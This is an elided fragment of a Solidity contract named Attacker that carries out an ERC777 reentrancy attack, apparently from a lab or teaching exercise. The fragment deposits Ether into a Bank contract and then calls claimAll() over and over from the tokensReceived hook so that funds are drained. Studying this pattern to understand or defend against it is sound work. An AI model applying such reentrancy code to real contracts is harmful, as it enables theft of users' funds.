...
contract Attacker is AccessControl, IERC777Recipient {
	...
	*/
	function attack(uint256 amt) payable public {
      require( address(bank) != address(0), "Target bank not set" );
		  ...
		  require(msg.value >= amt, "Insufficient Ether provided");

			// Step 1: Deposit the initial amount of Ether into the Bank contract
			bank.deposit{value: amt}();

			// Step 2: Start the reentrancy attack by calling claimAll()
			bank.claimAll();
	}
	...
	*/
	function tokensReceived(
		...
		// Call claimAll again to continue the reentrancy attack
		bank.claimAll();
